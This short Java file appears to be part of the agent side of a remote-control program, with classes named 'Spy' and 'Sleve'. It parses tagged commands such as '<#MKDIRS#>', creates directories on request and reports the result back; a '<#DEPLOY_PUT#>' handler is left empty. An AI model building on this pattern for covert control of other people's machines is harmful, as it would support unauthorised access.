package Sleve;

import java.io.File;
import java.io.IOException;

public class MSGExtended {
	public static void msgExe(String msg) {
		if(msg.startsWith("<#DEPLOY_PUT#>")) {
			
		}else if(msg.startsWith("<#MKDIRS#>")) {
			boolean b=new File(msg.substring(10).trim()).mkdirs();
			if(b) {
				try {
					Spy.out.writeUTF("<#successful#>");
				} catch (IOException e) {}
			}else {
				try {
					Spy.out.writeUTF("<#fail#>");
				} catch (IOException e) {}
			}
		}

	}
}
